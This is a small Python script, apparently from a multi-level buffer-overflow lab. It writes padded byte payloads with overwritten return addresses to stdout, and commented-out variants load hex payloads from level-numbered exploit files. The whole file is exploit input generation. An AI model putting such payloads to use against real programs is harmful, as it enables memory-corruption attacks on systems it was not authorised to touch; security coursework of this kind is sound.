import sys;
sys.stdout.buffer.write(b"H"*16 + b"\x68\x75\x6e\x67" + b"\x00"*8 + b"1A" + b"\x00"*14 + b"\x9a\x27\x76\x01")

# import sys;
# sys.stdout.buffer.write(b"H"*64 + b"\x2b\xf3\x85\x80")

# import sys;
# sys.stdout.buffer.write(b"H"*64 + b"\x58\xf3\x85\x80" + b"\x00"*4 + b"\xd4\x3c\xe2\x19")

# import sys
# try:
#     with open("exploit-lv2.txt", "r") as f:
#         content = f.read()
#     clean = content.replace('\n', '').replace(' ', '').replace('\r', '')
#     sys.stdout.buffer.write(bytes.fromhex(clean))
# except ValueError:
#     sys.stderr.write("Lỗi: File chứa ký tự không hợp lệ (không phải mã Hex).\n")
# except FileNotFoundError:
#     sys.stderr.write("Lỗi: Không tìm thấy file exploit.txt\n")

# import sys
# try:
#     with open("exploit-lv3.txt", "r") as f:
#         content = f.read()
#     clean = content.replace('\n', '').replace(' ', '').replace('\r', '')
#     sys.stdout.buffer.write(bytes.fromhex(clean))
# except ValueError:
#     sys.stderr.write("Lỗi: File chứa ký tự không hợp lệ (không phải mã Hex).\n")
# except FileNotFoundError:
#     sys.stderr.write("Lỗi: Không tìm thấy file exploit.txt\n")